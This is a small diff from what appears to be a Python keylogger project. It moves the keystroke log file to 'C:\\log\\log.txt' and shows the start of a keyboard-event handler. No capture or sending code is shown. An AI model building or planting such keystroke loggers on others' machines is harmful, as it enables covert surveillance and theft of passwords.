@@ -3,7 +3,7 @@ import sys
 import pythoncom
 import logging
 
-file_log = 'C:\\PROJECTS\\PycharmProjects\\Python-Project\Key_logger\\log.txt'
+file_log = 'C:\\log\\log.txt'
 
 
 def on_key_board_event(event):
